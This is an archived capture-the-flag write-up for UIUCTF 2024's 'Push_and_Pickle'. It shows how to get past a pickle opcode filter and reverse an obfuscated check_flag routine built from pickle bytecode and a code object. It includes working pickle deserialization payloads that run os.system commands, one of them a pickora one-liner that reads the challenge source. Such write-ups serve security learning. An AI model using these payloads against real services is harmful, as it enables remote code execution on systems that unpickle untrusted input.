# Push_and_Pickle

**CTF:** UIUCTF 2024  
**Category:** misc  
**Original writeup:** <https://medium.com/@harryfyx/writeup-uiuctf-2024-push-and-pickle-cf821c49194f> — by **harryfyx**. All credit goes to the original author; this is an archived copy.

---

category: misc (but kind of feels like reverse)

Description

We are given a Python script that runs pickle deserialization, and there is a check function:

for opcode, _, _ in pickletools.genops(cucumber):

if opcode.code == "c" or opcode.code == "\x93":

print("Eww! I can't eat dill pickles.")

sys.exit(0)

There is also a redacted check_flag funciton. So, we are interested in getting the details of that function.

Solution

First glance

As we know, pickle deserialization on user input is dangerous.

This check prevents a basic pickle payload from ChatGPT. Let’s see why.

import os

import pickle

import base64

import pickletools



class MyClass(object):

def __reduce__(self):

return (os.system,('ls',))



data = pickle.dumps(MyClass())

print(base64.b64encode(data))



pickletools.dis(data)



# b'gASVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJsc5SFlFKULg=='

# 0: \x80 PROTO 4

# 2: \x95 FRAME 29

# 11: \x8c SHORT_BINUNICODE 'posix'

# 18: \x94 MEMOIZE (as 0)

# 19: \x8c SHORT_BINUNICODE 'system'

# 27: \x94 MEMOIZE (as 1)

# 28: \x93 STACK_GLOBAL

# 29: \x94 MEMOIZE (as 2)

# 30: \x8c SHORT_BINUNICODE 'ls'

# 34: \x94 MEMOIZE (as 3)

# 35: \x85 TUPLE1

# 36: \x94 MEMOIZE (as 4)

# 37: R REDUCE

# 38: \x94 MEMOIZE (as 5)

# 39: . STOP

# highest protocol among opcodes = 4

We see the opcode ‘\x93’ is used. To bypass this, we need to know how pickle works.

When it deserializes data, the data are treated as pickle bytecode, and interpreted as actual instructions, therefore is possible for code execution.

What is opcode ‘\x93’?

We see the source code.

STACK_GLOBAL = b'\x93' # same as GLOBAL but using names on the stacks

GLOBAL = b'c' # push self.find_class(modname, name); 2 string args

Basically, we we have a stack like this [‘os’, ‘system’], and then run STACK_GLOBAL, we will then have [<os.system>]. We only had strings, now we find the function with that name.

Ok, how to bypass the check?

Googling around, we can see a payload from Python documentation.

Also, to avoid using ‘\x93’, we can use this. But it fails the other check.

b"cos

system

(S'echo hello world'

tR."



highest protocol among opcodes = 4

0: c GLOBAL 'os system'

11: ( MARK

12: S STRING 'echo hello world'

32: t TUPLE (MARK at 11)

33: R REDUCE

34: . STOP

highest protocol among opcodes = 0

Does it mean that we cannot use global functions? Do we not need them? Can we just get the code object for the check_flag function, and not use any globals? If you try that, we will see that even that function is a global.

Ok, are there other more instructions to execute globals? Checking the documentation we can see some. Maybe we edit the bytes and craft the pickle instructions ourselves?

Before that, we should do another search. Luckily we find this very nice tool.

Let’s have a payload to see the entire file.

python -m pickora -c 'INST("os", "system", ("cat chal.py",))' -f base64

Figuring out the check_flag function

def check_flag(flag_guess: str):

"""REDACTED FOR PRIVACY"""



# What?! How did you find this? Well you won't be able to figure it out from here...

return pickle.loads(b'\x80\x04\x96+\x00\x00\x00\x00\x00\x00\x00lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8\x94\x8c' + len(flag_guess).to_bytes(1, 'little') + flag_guess.encode() + b'\x94\x8c\x08builtins\x8c\x03all\x93\x94\x94\x8c\x08builtins\x8c\x04list\x93\x94\x94\x8c\x08builtins\x8c\x03map\x93\x94\x94\x8c\x05types\x8c\x08CodeType\x93\x94(K\x01K\x00K\x00K\x01K\x05KCC<|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00(NK\x00K\x01K\x02KaK\xcbt\x8c\x03len\x8c\x01b\x8c\x03ord\x87\x8c\x01x\x85\x8c\x08<pickle>\x8c\x08<pickle>K\x07C\x00tR\x940\x8c\x05types\x8c\x0cFunctionType\x93\x94(h\t}(\x8c\x03len\x8c\x08builtins\x8c\x03len\x93\x94\x94\x8c\x01bh\x01\x8c\x03ord\x8c\x08builtins\x8c\x03ord\x93\x94\x94uN)tR\x8c\x08builtins\x8c\tenumerate\x93\x94\x94h\x00\x85R\x86R\x85R\x85R.')

We see the source code of this function. Clearly it is using code execution by pickle to check the flag. We know how to deal with this trick, since we can disassemble pickle bytecode with pickletools. Note that 77777778888888 is my test flag.

0: \x80 PROTO 4

2: \x96 BYTEARRAY8 bytearray(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8')

54: \x94 MEMOIZE (as 0)

55: \x8c SHORT_BINUNICODE '77777778888888'

71: \x94 MEMOIZE (as 1)

72: \x8c SHORT_BINUNICODE 'builtins'

82: \x8c SHORT_BINUNICODE 'all'

87: \x93 STACK_GLOBAL

88: \x94 MEMOIZE (as 2)

89: \x94 MEMOIZE (as 3)

90: \x8c SHORT_BINUNICODE 'builtins'

100: \x8c SHORT_BINUNICODE 'list'

106: \x93 STACK_GLOBAL

107: \x94 MEMOIZE (as 4)

108: \x94 MEMOIZE (as 5)

109: \x8c SHORT_BINUNICODE 'builtins'

119: \x8c SHORT_BINUNICODE 'map'

124: \x93 STACK_GLOBAL

125: \x94 MEMOIZE (as 6)

126: \x94 MEMOIZE (as 7)

127: \x8c SHORT_BINUNICODE 'types'

134: \x8c SHORT_BINUNICODE 'CodeType'

144: \x93 STACK_GLOBAL

145: \x94 MEMOIZE (as 8)

146: ( MARK

147: K BININT1 1

149: K BININT1 0

151: K BININT1 0

153: K BININT1 1

155: K BININT1 5

157: K BININT1 67

159: C SHORT_BINBYTES b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00'

221: ( MARK

222: N NONE

223: K BININT1 0

225: K BININT1 1

227: K BININT1 2

229: K BININT1 97

231: K BININT1 203

233: t TUPLE (MARK at 221)

234: \x8c SHORT_BINUNICODE 'len'

239: \x8c SHORT_BINUNICODE 'b'

242: \x8c SHORT_BINUNICODE 'ord'

247: \x87 TUPLE3

248: \x8c SHORT_BINUNICODE 'x'

251: \x85 TUPLE1

252: \x8c SHORT_BINUNICODE '<pickle>'

262: \x8c SHORT_BINUNICODE '<pickle>'

272: K BININT1 7

274: C SHORT_BINBYTES b''

276: t TUPLE (MARK at 146)

277: R REDUCE

278: \x94 MEMOIZE (as 9)

279: 0 POP

280: \x8c SHORT_BINUNICODE 'types'

287: \x8c SHORT_BINUNICODE 'FunctionType'

301: \x93 STACK_GLOBAL

302: \x94 MEMOIZE (as 10)

303: ( MARK

304: h BINGET 9

306: } EMPTY_DICT

307: ( MARK

308: \x8c SHORT_BINUNICODE 'len'

313: \x8c SHORT_BINUNICODE 'builtins'

323: \x8c SHORT_BINUNICODE 'len'

328: \x93 STACK_GLOBAL

329: \x94 MEMOIZE (as 11)

330: \x94 MEMOIZE (as 12)

331: \x8c SHORT_BINUNICODE 'b'

334: h BINGET 1

336: \x8c SHORT_BINUNICODE 'ord'

341: \x8c SHORT_BINUNICODE 'builtins'

351: \x8c SHORT_BINUNICODE 'ord'

356: \x93 STACK_GLOBAL

357: \x94 MEMOIZE (as 13)

358: \x94 MEMOIZE (as 14)

359: u SETITEMS (MARK at 307)

360: N NONE

361: ) EMPTY_TUPLE

362: t TUPLE (MARK at 303)

363: R REDUCE

364: \x8c SHORT_BINUNICODE 'builtins'

374: \x8c SHORT_BINUNICODE 'enumerate'

385: \x93 STACK_GLOBAL

386: \x94 MEMOIZE (as 15)

387: \x94 MEMOIZE (as 16)

388: h BINGET 0

390: \x85 TUPLE1

391: R REDUCE

392: \x86 TUPLE2

393: R REDUCE

394: \x85 TUPLE1

395: R REDUCE

396: \x85 TUPLE1

397: R REDUCE

398: . STOP

How to understand this disassembly?

One easy way would be run it and see the stacks. If we go to Python and print out pickle’s source code location, we can change its behavior. JUST DO NOT FORGET TO CHANGE IT BACK!

>>> import pickle

>>> pickle.__file__

'/usr/lib/python3.11/pickle.py'

But wait! Since the pickle bytecode involves code objects, and they are different in different python versions, we should first figure out the python version.

This can be done by executing on the challenge server, and getting out its Python version, which is 3.9.6. We should install that. I am on Kali Linux; simply download the source code, configure and make altinstall. See the commands below (by ChatGPT).

wget https://www.python.org/ftp/python/3.9.6/Python-3.9.6.tgz

tar -xf Python-3.9.6.tgz

cd Python-3.9.6

./configure --enable-optimizations

make -j $(nproc)

sudo make altinstall

python3.9 --version

Now we see the source code location again.

└─$ python3.9

Python 3.9.6 (default, Jun 30 2024, 11:44:57)

[GCC 13.2.0] on linux

Type "help", "copyright", "credits" or "license" for more information.

>>> import pickle

>>> pickle.__file__

'/usr/local/lib/python3.9/pickle.py'

We backup the file, and change it to allow debugging. If you are unfamiliar with Python debugging, and not sure where in the source code is being run, basically keep putting prints in places until you understand the code. Python will run the imported code from line 1.

After some tinkering, we can see that there is a python implementation of the unpickler that is not used by default. To use it, we play a trick like this:

# Use the faster _pickle if possible

try:

from _pickle import (

PickleError,

PicklingError,

UnpicklingError,

Pickler,

Unpickler,

dump,

dumps,

load,

loads, doesnotexist # see what we did here?

)

except ImportError:

Pickler, Unpickler = _Pickler, _Unpickler

dump, dumps, load, loads = _dump, _dumps, _load, _loads # we want this

Now, let’s print the stack for every instruction:

def load(self):

"""Read a pickled object representation from the open file.



Return the reconstituted object hierarchy specified in the file.

"""

# Check whether Unpickler was initialized correctly. This is

# only needed to mimic the behavior of _pickle.Unpickler.dump().

if not hasattr(self, "_file_read"):

raise UnpicklingError("Unpickler.__init__() was not called by "

"%s.__init__()" % (self.__class__.__name__,))

self._unframer = _Unframer(self._file_read, self._file_readline)

self.read = self._unframer.read

self.readinto = self._unframer.readinto

self.readline = self._unframer.readline

self.metastack = []

self.stack = []

self.append = self.stack.append

self.proto = 0

read = self.read

dispatch = self.dispatch

try:

while True:

key = read(1)

if not key:

raise EOFError

assert isinstance(key, bytes_types)

dispatch[key[0]](self);print(self.stack) # print here

except _Stop as stopinst:

return stopinst.value

Way better. We can see what is going on inside the program, by what is changing in the stack print. At one point, we have this:

# [

# bytearray(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'),

# '77777778888888',

# <built-in function all>,

# <class 'list'>,

# <class 'map'>,

# <class 'code'>,

# (1, 0, 0, 1, 5, 67, b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00', (None, 0, 1, 2, 97, 203), ('len', 'b', 'ord'), ('x',), '<pickle>', '<pickle>', 7, b'')

# ]

Hell! What is this code object now?

Similar to how to print the stack, you can get the code object out, and disassemble that too.

# (Pdb) dis.dis(temp)

# 0 LOAD_FAST 0 (x) # [x]

# 2 LOAD_CONST 1 (0) # [x, 0]

# 4 BINARY_SUBSCR # [x[0]]

# 6 LOAD_GLOBAL 0 (len)# [x[0], len]

# 8 LOAD_GLOBAL 1 (b) # [x[0], len, b]

# 10 CALL_FUNCTION 1 # [x[0], len(b)]

# 12 COMPARE_OP 0 (<) # [x[0] < len(b)]

# 14 JUMP_IF_FALSE_OR_POP 58 # fail if not (x[0] < len(b))

# 16 LOAD_FAST 0 (x) # [x]

# 18 LOAD_CONST 2 (1)

# 20 BINARY_SUBSCR # [x[1]]

# 22 LOAD_GLOBAL 2 (ord) # [x[1], ord]

# 24 LOAD_GLOBAL 1 (b) # [x[1], ord, b]

# 26 LOAD_FAST 0 (x) # [x[1], ord, b, x]

# 28 LOAD_CONST 1 (0)

# 30 BINARY_SUBSCR # [x[1], ord, b, x[0]]

# 32 BINARY_SUBSCR # [x[1], ord, b[x[0]]]

# 34 CALL_FUNCTION 1 # [x[1], ord(b[x[0]])]

# 36 LOAD_CONST 3 (2) # [x[1], ord(b[x[0]]), 2]

# 38 LOAD_FAST 0 (x) # [x[1], ord(b[x[0]]), 2, x]

# 40 LOAD_CONST 1 (0) # [x[1], ord(b[x[0]]), 2, x, 0]

# 42 BINARY_SUBSCR # [x[1], ord(b[x[0]]), 2, x[0]]

# 44 LOAD_CONST 4 (97)# [x[1], ord(b[x[0]]), 2, x[0], 97]

# 46 BINARY_ADD # [x[1], ord(b[x[0]]), 2, x[0]+97]

# 48 BINARY_MULTIPLY # [x[1], ord(b[x[0]]), 2 * (x[0]+97)]

# 50 BINARY_ADD # [x[1], ord(b[x[0]]) + 2 * (x[0]+97)]

# 52 LOAD_CONST 5 (203)

# 54 BINARY_MODULO # [x[1], ord(b[x[0]]) + 2 * (x[0]+97) % 203]

# 56 COMPARE_OP 2 (==)

# >> 58 RETURN_VALUE

You can understand the disassembly by referring to the Python official documentation.

Put everything together

So the check_flag function is doing a series of checks using the code object on the flag. It checks the characters in the flag one by one. We can decompile the instructions to this Python code:

def check_decom(flag):

# assert len(flag) == 43

flag += '7' * (43 - len(flag))

ret = 0

for n, i in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):

correct = i == (ord(flag[n]) + 2 * (n + 97)) % 203

if not correct:

return ret

ret += 1

return ret

Let’s bruteforce this.

flag = ''

for i in range(43):

for c in range(0x20, 0x80):

r = check_decom(flag + chr(c))

if r >= i+1:

flag += chr(c)

print('flag:',flag)

break

Key takeaways

Offense:

Read the documentation carefully to look for bypass

Sometimes Python versions are tricky; pay attention to them!
